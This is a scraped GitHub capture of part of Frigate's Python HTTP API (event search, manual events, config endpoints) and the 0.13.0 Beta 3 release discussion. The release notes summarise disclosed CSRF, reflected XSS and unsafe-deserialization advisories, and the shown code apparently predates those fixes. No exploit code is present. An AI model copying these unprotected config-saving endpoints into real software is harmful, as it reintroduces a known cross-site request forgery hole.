 limit = request.args.get("limit", 100) after = request.args.get("after", type=float) before = request.args.get("before", type=float) has\_clip = request.args.get("has\_clip", type=int) has\_snapshot = request.args.get("has\_snapshot", type=int) in\_progress = request.args.get("in\_progress", type=int) include\_thumbnails = request.args.get("include\_thumbnails", default=1, type=int) favorites = request.args.get("favorites", type=int)
 clauses = [] excluded\_fields = []
 selected\_columns = [ Event.id, Event.camera, Event.label, Event.zones, Event.start\_time, Event.end\_time, Event.has\_clip, Event.has\_snapshot, Event.plus\_id, Event.retain\_indefinitely, Event.sub\_label, Event.top\_score, Event.false\_positive, Event.box, Event.data, ]
 if camera != "all": clauses.append((Event.camera == camera))
 if cameras != "all": camera\_list = cameras.split(",") clauses.append((Event.camera << camera\_list))
 if labels != "all": label\_list = labels.split(",") clauses.append((Event.label << label\_list))
 if sub\_labels != "all": # use matching so joined sub labels are included # for example a sub label 'bob' would get events # with sub labels 'bob' and 'bob, john' sub\_label\_clauses = [] filtered\_sub\_labels = sub\_labels.split(",")
 if "None" in filtered\_sub\_labels: filtered\_sub\_labels.remove("None") sub\_label\_clauses.append((Event.sub\_label.is\_null()))
 for label in filtered\_sub\_labels: sub\_label\_clauses.append( (Event.sub\_label.cast("text") == label) ) # include exact matches
 # include this label when part of a list sub\_label\_clauses.append((Event.sub\_label.cast("text") % f"\*{label},\*")) sub\_label\_clauses.append((Event.sub\_label.cast("text") % f"\*, {label}\*"))
 sub\_label\_clause = reduce(operator.or\_, sub\_label\_clauses) clauses.append((sub\_label\_clause))
 if zones != "all": # use matching so events with multiple zones # still match on a search where any zone matches zone\_clauses = [] filtered\_zones = zones.split(",")
 if "None" in filtered\_zones: filtered\_zones.remove("None") zone\_clauses.append((Event.zones.length() == 0))
 for zone in filtered\_zones: zone\_clauses.append((Event.zones.cast("text") % f'\*"{zone}"\*'))
 zone\_clause = reduce(operator.or\_, zone\_clauses) clauses.append((zone\_clause))
 if after: clauses.append((Event.start\_time > after))
 if before: clauses.append((Event.start\_time < before))
 if has\_clip is not None: clauses.append((Event.has\_clip == has\_clip))
 if has\_snapshot is not None: clauses.append((Event.has\_snapshot == has\_snapshot))
 if in\_progress is not None: clauses.append((Event.end\_time.is\_null(in\_progress)))
 if not include\_thumbnails: excluded\_fields.append(Event.thumbnail) else: selected\_columns.append(Event.thumbnail)
 if favorites: clauses.append((Event.retain\_indefinitely == favorites))
 if len(clauses) == 0: clauses.append((True))
 events = ( Event.select(\*selected\_columns) .where(reduce(operator.and\_, clauses)) .order\_by(Event.start\_time.desc()) .limit(limit) )
 return jsonify([model\_to\_dict(e, exclude=excluded\_fields) for e in events])
@bp.route("/events/<camera\_name>/<label>/create", methods=["POST"])def create\_event(camera\_name, label): if not camera\_name or not current\_app.frigate\_config.cameras.get(camera\_name): return make\_response( jsonify( {"success": False, "message": f"{camera\_name} is not a valid camera."} ), 404, )
 if not label: return make\_response( jsonify({"success": False, "message": f"{label} must be set."}), 404 )
 json: dict[str, any] = request.get\_json(silent=True) or {}
 try: frame = current\_app.detected\_frames\_processor.get\_current\_frame(camera\_name)
 event\_id = current\_app.external\_processor.create\_manual\_event( camera\_name, label, json.get("source\_type", "api"), json.get("sub\_label", None), json.get("score", 0), json.get("duration", 30), json.get("include\_recording", True), json.get("draw", {}), frame, ) except Exception as e: return make\_response( jsonify({"success": False, "message": f"An unknown error occurred: {e}"}), 500, )
 return make\_response( jsonify( { "success": True, "message": "Successfully created event.", "event\_id": event\_id, } ), 200, )
@bp.route("/events/<event\_id>/end", methods=["PUT"])def end\_event(event\_id): json: dict[str, any] = request.get\_json(silent=True) or {}
 try: end\_time = json.get("end\_time", datetime.now().timestamp()) current\_app.external\_processor.finish\_manual\_event(event\_id, end\_time) except Exception: return make\_response( jsonify( {"success": False, "message": f"{event\_id} must be set and valid."} ), 404, )
 return make\_response( jsonify({"success": True, "message": "Event successfully ended."}), 200 )
@bp.route("/config")def config(): config = current\_app.frigate\_config.dict()
 for camera\_name, camera in current\_app.frigate\_config.cameras.items(): camera\_dict = config["cameras"][camera\_name]
 # clean paths for input in camera\_dict.get("ffmpeg", {}).get("inputs", []): input["path"] = clean\_camera\_user\_pass(input["path"])
 # add clean ffmpeg\_cmds camera\_dict["ffmpeg\_cmds"] = copy.deepcopy(camera.ffmpeg\_cmds) for cmd in camera\_dict["ffmpeg\_cmds"]: cmd["cmd"] = clean\_camera\_user\_pass(" ".join(cmd["cmd"]))
 config["plus"] = {"enabled": current\_app.plus\_api.is\_active()}
 for detector, detector\_config in config["detectors"].items(): detector\_config["model"][ "labelmap" ] = current\_app.frigate\_config.model.merged\_labelmap
 return jsonify(config)
@bp.route("/config/raw")def config\_raw(): config\_file = os.environ.get("CONFIG\_FILE", "/config/config.yml")
 # Check if we can use .yaml instead of .yml config\_file\_yaml = config\_file.replace(".yml", ".yaml")
 if os.path.isfile(config\_file\_yaml): config\_file = config\_file\_yaml
 if not os.path.isfile(config\_file): return "Could not find file", 410
 with open(config\_file, "r") as f: raw\_config = f.read() f.close()
 return raw\_config, 200
@bp.route("/config/save", methods=["POST"])def config\_save(): save\_option = request.args.get("save\_option")[View remainder of file in raw view](https://github.com/blakeblackshear/frigate/raw/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6c730b88_20250114_202645.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fdiscussions%2F8366)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fdiscussions%2F8366)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fdiscussions_fragments%2Fdiscussion_layout&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

# 0.13.0 Beta 3 #8366

Locked

[NickM-27](/NickM-27)
started this conversation in
[General](/blakeblackshear/frigate/discussions/categories/general)

[0.13.0 Beta 3](#top)
#8366

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=40&v=4)
NickM-27](/NickM-27)

Oct 28, 2023
·
18 comments
·
142 replies

[Return to top](#top)

Discussion options

# {{title}}

Something went wrong.

Quote reply

## [NickM-27](/NickM-27) [Oct 28, 2023](#discussion-5787446) Collaborator Sponsor

 -

| Beta docs for this release: <https://deploy-preview-6262--frigate-docs.netlify.app> Major Changes For 0.13.0Security Advisories The [Github Security Lab](https://securitylab.github.com/) team reached out to report the following security vulnerabilities.   * [Cross-site request forgery in `config_save` and `config_set` request handlers (GHSL-2023-198)](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-xq49-hv88-jr6h) * [Reflected XSS through `/<camera_name>` API endpoints (GHSL-2023-195)](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-jjxc-m35j-p56f) * [Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (GHSL-2023-190)](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-qp3h-4q62-p428)   Exploiting these vulnerabilities requires the attacker to both know very specific information about a user's Frigate server and requires an authenticated user to be tricked into clicking a specially crafted link to their Frigate instance.  This vulnerability could exploited by an attacker under the following circumstances:   1. Frigate publicly exposed to the internet (even with some authentication methods implemented) 2. Attacker knows the public address of a user's Frigate instance 3. Attacker crafts a specialized page which links to the user's Frigate instance 4. Attacker finds a way to get an authenticated user to visit their specialized page and click the button/link   If you haven't click any links to your Frigate server from unknown sources, there is no reason to believe that you have been compromised.  I have enabled the private vulnerability disclosure features inside Github for the project as well as the automated CodeQL scanning features to identify future issues. Changes since Beta 2  * A breaking change to the integration was introduced. You will need to update to the beta version of the integration. * Frigate will now use the historical entries in the recordings timeline to create a grid of the expected size of objects, this will improve the accuracy of detection when motion is first detected. Motion is also optimized to reduce cases where a persons legs or arms were detected separately which led to multiple events for the same object. * Many optimizations around stationary objects to optimize frequency and improve accuracy of checks for stationary objects. * Motion detection calibration has been revamped to be dynamic, this is important for cases where motion was occurring after a large change; for example when someone is walking in the frame after moving a ptz camera. * New recording timeline entries for Frigate+ attributes that show the moment an attribute (amazon, face, fedex, license\_plate, ups) were first detected. * Many camera auto tracking improvements including optimizations to movement, zoom, and camera calibration. * Ongoing and past events are now separated in the events list * Many UI fixes and optimizations  Breaking Changes  * Default values have been changed for motion detection. If you have specific values set in your config, it is recommended to remove them and re-calibrate as necessary. * Stationary object validation is now required, anyone who manually set `interval: 0` will need to delete this field from the config or increase the value * Changes have been made to the DB schema, downgrading to 0.12 will require restoring from a backup or deleting the DB and existing recordings / snapshots.   NOTE: Some users have reported migrations taking a while and frigate frontend is not available until the migrations are complete. * New location for `frigate.db`: Due to the support for network shares in HA OS and the popularity of storing recordings on a NAS in general, the database has a new default location of `/config/frigate.db`. This change is going to be done for existing users too, so frigate will automatically move the db for you.   + **For Frigate Addon Users**:     The migration is handled automatically and no action is required from the user.   + **For Docker Container Users**:     The migration is handled for you, but you must make sure that the docker CLI or docker-compose binds the entire `/config` directory and not just the `/config/config.yml` file.  For example, if your current volume mapping is `- /host/path/config_folder/config.yml:/config/config.yml` it should now be `- /host/path/config_folder/:/config/` * The previously deprecated `record -> retain_days` config has been removed, this should be migrated to `record -> retain -> days` if you have not already. * HomeAssistant [Integration 5.0 beta](https://github.com/blakeblackshear/frigate-hass-integration/releases/tag/v5.0.0-beta.1) is required for the new features introduced in this release. * TensorRT has been updated and the model generation has been refactored. New models will need to be generated for 0.13 and have a new path, check the detector docs for more info. * TensorRT now requires Nvidia Driver Version 530+ * The cameras in `/stats` have been moved to their own `cameras` block. This only affects users that were directly reading from the `/stats` data via the API or MQTT.  Frigate+Frigate+ Model Launch Frigate+ models are now rolling out by invitation. If you would like to be invited for early access to purchase a subscription, please send an email to blake@frigate.video from the email address on your Frigate+ account. For more information, see [this discussion](https://github.com/blakeblackshear/frigate/discussions/7932). False positive submissions You can now submit false positive detections to Frigate+ for training feedback. Note that you will still need to login to your Frigate+ account and verify the images to ensure all relevant objects are labeled before the image will be used during training. Confirming the object is a true positive will also upload the image.  [image](https://user-images.githubusercontent.com/569905/233863279-e9567eef-0192-4cb1-993c-23b618c854ba.png) Models Frigate+ models are almost ready for launch, and this release has support for automatically downloading from Frigate+. The model and related information are stored at `/config/model_cache`. Once Frigate+ models are launched, you will be able to use the model id in your config.  ``` model:   path: plus://e63b7345cc83a84ed79dedfc99c16616 ``` Community Supported Boards In version 0.12 Frigate gained support for Intel iGPUs via OpenVINO and for Nvidia GPUs, this was a great step forward for compatibility and for more users being able to use Frigate effectively. There are many other devices, including dedicated SBCs (Small Board Computers), that Frigate could support but the maintainers do not have the time or hardware to support.  The community supported boards framework will allow community members who want to contribute to create and manage support for a particular board. This will allow Frigate to support more devices while allowing the maintainers to focus on improving the core of Frigate. Nvidia Jetson Support [@madsciencetist](https://github.com/madsciencetist) is the first to contribute a community supported board build by adding support for Jetson 4.6 and Jetson 5 devices!  More information can be found in the detector docs on how to set this up.  <https://deploy-preview-6262--frigate-docs.netlify.app/configuration/object_detectors#nvidia-tensorrt-detector> Object Tracking & Motion Detection There have been many improvements to object tracking and motion detection which make Frigate more efficient and can reduce false positives. New Object Tracker Frigate now uses Norfair for object tracking, this means that object attributes like size, width/height ratio, and position are used to intelligently track objects. ID swapping between tracked objects is greatly reduced in situations where a car in the driveway was confused with a car passing in the street. Improved Motion Detection Frigate's motion detection is now more efficient. Motion detection will also re-calibrate for flashes like lightning or when the camera switches from color to IR mode or it is moved via PTZ. This reduces CPU usage during these changes and reduces false positives caused by excessive motion. Historical Data Frigate now uses the recordings timeline data to generate an 8x8 grid for each camera. This grid holds the range of expected regions (portions of the image sent to detection) for that area of the camera frame. This helps to improve accuracy of detection after motion has occurred and can reduce false positives in some cases.  The grid is updated on each startup and every day at 2 AM for each camera that is enabled. Minimum Time For Zone Presence Frigate now has a configurable field for the minimum amount of time an object needs to be in a zone before it is considered in a zone. For example, currently in Frigate if you have a front\_yard zone and someone is walking by and briefly steps into the front yard Frigate would create an event for this. However, you may prefer for events to only be created if a person is in the front yard for multiple frames before creating an event.  ``` zones:   my_zone:     inertia: 3  # <- 3 consecutive frames needed to consider object in zone     coordinates: ... ``` Recordings Improvements There have been a number of improvements to the management of recordings Recordings Exporting Frigate now supports exporting recordings in standard format or as a time-lapse. Exported recordings are stored in `/media/frigate/exports` and are downloadable from the UI.  [Screen Shot 2023-07-15 at 07 38 26 AM](https://private-user-images.githubusercontent.com/14866235/253751539-d0d4a5a7-b97f-448d-a938-31f40c805968.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNDg2NjIzNS8yNTM3NTE1MzktZDBkNGE1YTctYjk3Zi00NDhkLWE5MzgtMzFmNDBjODA1OTY4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWI0YTlhODQxYjRhODYyNTgyZDA2OTEyOGUxYmJlN2E3MWViMjdlNDlmNWM2YWU4YTg0YjY5OTI1MDQwNDk1MGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.qcopJ6lKQ4rcSr0u6GVmMrEuO1k3rukup3eiaZC_EWg) Recordings Timeline Metadata Frigate now saves metadata for key moments in an event such as when the tracked object is detected, enters or exits zone, becomes active / stationary, and leaves. This metadata is used to overlay on top of the recordings so it is easy to see what was detected and where. Note that the timing of the bounding boxes will likely be slightly off because it is based on the detect stream, but overlayed on the record stream. The `annotation_offset` value in the config can be used to adjust for any differences.  [Screen Shot 2023-07-27 at 05 41 33 AM](https://private-user-images.githubusercontent.com/14866235/256525372-cb79ba77-e4b6-4496-a8e7-dc04b754c895.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNDg2NjIzNS8yNTY1MjUzNzItY2I3OWJhNzctZTRiNi00NDk2LWE4ZTctZGMwNGI3NTRjODk1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZmOWY4Y2FmYzk3MzA0NWNkOTM0NDZjYzgxOWYxOWIwZGRhODUzYjBlYzdiNzFiMGY2MTY4NDBjMGU4OWNkYzEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2B6xjk0N8tXiR5sy8YKFjvf85ae-IM2m_DwW0ERJzrI) Internal Processing Improvements There have been many improvements to the recordings management process to make it faster and more efficient:   * Recordings maintainer now lives in a dedicated process * Recordings maintenance is now fully asynchronous * Database writes are now much more efficient * Record config can now have `sync_on_startup` enabled which will check for recordings in the db that are not on the disk and delete them  Audio Events Frigate now supports audio events via YamNet. Over 600 labels are included so there are too many to list here, but Frigate can listen to a cameras audio feed to create events and update MQTT when speech, yell, fire alarm, dog bark, etc. are heard. [Version 5.0 of the HomeAssistant integration](https://github.com/blakeblackshear/frigate-hass-integration/releases/tag/v5.0.0-beta.1) also supports sensors for these audio detections so automations can be fired when certain types of audio are detected.  [Screen Shot 2023-07-27 at 06 13 34 AM](https://private-user-images.githubusercontent.com/14866235/256532441-0a487d65-53f4-4eaa-a6fe-56a8b688a333.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNDg2NjIzNS8yNTY1MzI0NDEtMGE0ODdkNjUtNTNmNC00ZWFhLWE2ZmUtNTZhOGI2ODhhMzMzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThiMTkxZGEzMDg3NGJmZTIwMTI4NDc0Y2NhMmIxMjcxZDRjNDIxYmUyZWRhN2M4OWQwZDJmYjc3MjZjOGRlZTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vX0Oo45gd-Ms_w1d4Y11lRgt-CEVet8dIrz43C7kImQ) Manual Events API Frigate now supports creating events manually via the API. This means that custom events can be created, for example an event when the doorbell is pressed or a sensor is tripped. The API allows full control of event length, if recordings should be saved, and much more. The request and response can be seen in the [documentation](https://deploy-preview-6262--frigate-docs.netlify.app/integrations/api#post-apieventscamera_namelabelcreate).  Curl Example:  ``` curl -X POST "http://<frigate_ip>:5000/api/events/front_doorbell_cam/doorbell/create" -H Content-Type:\ application/json ``` PTZ Control Frigate now supports PTZ cameras. Basic PTZ Autotracking [autotrack](https://github.com/blakeblackshear/frigate/blob/dev/docs/static/img/frigate-autotracking-example.gif?raw=true)  [autotrack_debug](https://github.com/blakeblackshear/frigate/blob/dev/docs/static/img/autotracking-debug.gif?raw=true)  <https://deploy-preview-6262--frigate-docs.netlify.app/configuration/autotracking>  Along with Frigate's improved tracking algorithm, basic autotracking is now supported. Not all PTZ cameras will support this as relative movement is required (see the docs for more details). PTZ Controls In The WebUI Frigate also supports controlling PTZ cameras in the WebUI and via the Home Assistant Integration.  [Screen Shot 2023-02-08 at 07 06 21 AM](https://user-images.githubusercontent.com/14866235/217552681-080b4ad6-157a-4d46-8d92-87b0b1978d3e.png) Other Notable Changes:  * MSE is now supported on iPhones running iOS 17.1+ * The events page has been updated to show the ongoing events at the top and past events below. The ongoing events section can be collapsed at any point. * The ordering of birdseye cameras is now supported * Birdseye now supports autolayout meaning that a grid system is no longer used. Panoramic and portrait cameras now take up a proportional amount of space to better use the canvas to show these cameras. * Camera zone & mask editor now supports saving directly without the need to copy / paste * Deepstack/CodeProjectAI is now supported as a detector.  Images  * `ghcr.io/blakeblackshear/frigate:0.13.0-beta3` * `ghcr.io/blakeblackshear/frigate:0.13.0-beta3-standard-arm64` * `ghcr.io/blakeblackshear/frigate:0.13.0-beta3-tensorrt` * `ghcr.io/blakeblackshear/frigate:0.13.0-beta3-tensorrt-jp4` * `ghcr.io/blakeblackshear/frigate:0.13.0-beta3-tensorrt-jp5`   **Full Changelog**: [v0.12.1...v0.13.0-beta3](https://github.com/blakeblackshear/frigate/compare/v0.12.1...v0.13.0-beta3) |
| --- |

Beta
Was this translation helpful?
Give feedback.

5
 You must be logged in to vote

 🎉
1

All reactions

* 🎉
  1

## Replies: 18 comments · 142 replies

* [Oldest](/blakeblackshear/frigate/discussions/8366?sort=old)
* [Newest](/blakeblackshear/frigate/discussions/8366?sort=new)
* [Top](/blakeblackshear/frigate/discussions/8366?sort=top)

Comment options

# {{title}}

Something went wrong.

Quote reply

### [Oct 29, 2023](#discussioncomment-7414153)

 -

| Just going to write a comment of appreciation for the manual / API events. By having an event on doorbell press I am FINALLY getting consistent clear face pictures for doubetake.. Before I was getting fairly off to the side profile pics as people waited, but just about everyone looks directly at the camera / button as they press it. |
| --- |

Beta
Was this translation helpful?
Give feedback.

5
 You must be logged in to vote

All reactions

8 replies

Show 3 previous replies

[![@bagobones](https://avatars.githubusercontent.com/u/1587701?s=60&v=4)](/bagobones)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [bagobones](/bagobones) [Oct 29, 2023](#discussioncomment-7417798)

 -

| Thank you [@bagobones](https://github.com/bagobones) works perfectly for me, this is brilliant. Thanks also to the Dev teams :)  Also for clarity in my example there are some redundant values. My event is called doorbell and so is the camera. Likewise I define a default of 60 for the duration in case none is passed but in my example I pass a duration of 60 but it could be what ever you want. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@chrisandsally](https://avatars.githubusercontent.com/u/89684974?s=60&v=4)](/chrisandsally)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [chrisandsally](/chrisandsally) [Oct 29, 2023](#discussioncomment-7418080)

 -

| Thank you, Do you know if there is a retention policy for manuals calls, does it follow the camera defined one? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 29, 2023](#discussioncomment-7418083) Collaborator Author Sponsor

 -

| yes, it follows whatever is set for the camera or you can set it for that specific label  ``` snapshots:   retain:     objects:       doorbell: 1  ``` |
| --- |

Beta
Was this translation helpful?
Give feedback.

 👍
1

All reactions

* 👍
  1

[![@bagobones](https://avatars.githubusercontent.com/u/1587701?s=60&v=4)](/bagobones)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [bagobones](/bagobones) [Oct 30, 2023](#discussioncomment-7419290)

 -

| One important thing to note is that manual events do not generate recording segments. YOu need a recording policy of all or if you have motion set as the recording type there must be motion at the time of the event.  This is a limitation of manual events and it confused me as I expected them to record ALWAYS but events happen on top of recordings with the way frigate works. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@towerhand](https://avatars.githubusercontent.com/u/42445253?s=60&v=4)](/towerhand)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [towerhand](/towerhand) [Nov 1, 2023](#discussioncomment-7448050)

 -

| Thank you for sharing. It works like a charm.  Is there a way to grab the snapshot of the created event from Home Assistant? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [Oct 29, 2023](#discussioncomment-7417838)

 -

| I saw some of the new API changes and one of them was [Submits the snapshot of the event to Frigate+ for labeling.](https://deploy-preview-6262--frigate-docs.netlify.app/integrations/api#post-apieventsidplus)  I tried to use a simple bash loop script to send a bunch of images I know are valid to Frigate+ so that I can go and verify and save them pretty quickly hoping the Frigate bounding box would be sent if I included a include\_annotation=1 in the POST but all the ones I tested uploaded with no bounding box. I know there is a separate function for false\_positive but are my expectations wrong?  Here is my super simple bash script for testing:  ``` for i in $(curl -s "http://localhost:5000/api/events?is_submitted=0" | jq '.[].id' | sed 's/"//g') do         curl -X POST "http://localhost:5000/api/events/$i/plus?include_annotation=1" done  ```  Thanks! |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

4 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 29, 2023](#discussioncomment-7418395) Collaborator Author Sponsor

 -

| You need to set the type to json with the json header. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 29, 2023](#discussioncomment-7418400) Collaborator Author Sponsor

 -

| And the include\_annotation is a json body arg not a query arg. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@krzakx](https://avatars.githubusercontent.com/u/18627339?s=60&v=4)](/krzakx)

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

#### [krzakx](/krzakx) [Oct 30, 2023](#discussioncomment-7421323)

 -

